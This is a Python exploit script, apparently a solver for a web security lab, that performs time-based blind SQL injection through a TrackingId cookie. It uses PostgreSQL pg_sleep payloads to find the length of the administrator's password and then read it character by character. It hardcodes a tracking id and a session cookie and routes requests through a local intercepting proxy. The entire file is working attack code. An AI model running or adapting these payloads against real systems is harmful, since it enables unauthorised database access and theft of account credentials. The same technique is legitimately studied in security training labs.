import sys
import urllib.parse
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def pass_length(url, trackingid, session):
    for i in range(1,41):
        payload = "' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>%s) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--" %i
        payload = urllib.parse.quote(payload)
        cookies = {'TrackingId':trackingid+payload, 'session':session}
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if int(r.elapsed.total_seconds()) < 10:
            print("[+] Password Length = %s" %i)
            return i
    return False

def sqli_password(url, trackingid, session):
    password = ""
    length = pass_length(url, trackingid, session)
    for i in range(1, length+1): # We add a +1 to length because the last number for range is non-inclusive
        for j in range(32, 126):
            payload = "' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,%s,1))='%s') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--" %(i,j)
            payload = urllib.parse.quote(payload)
            cookies={'TrackingId':trackingid+payload, 'session':session}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 9:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print("[-] Usage %s <url>" %sys.argv[0])
        print("[-] EXample: %s www.example.com" % sys.argv[0])
    
    print("[+] Searching for admininstrator password...")
        # Remember to change trackingid and session !!
    trackingid = '2qS5I6nFnKCDZl8E' 
    session = 'R4GaABjdnVa9fkpEtFEhqBtrijy2C2Cj'
    sqli_password(url, trackingid, session)
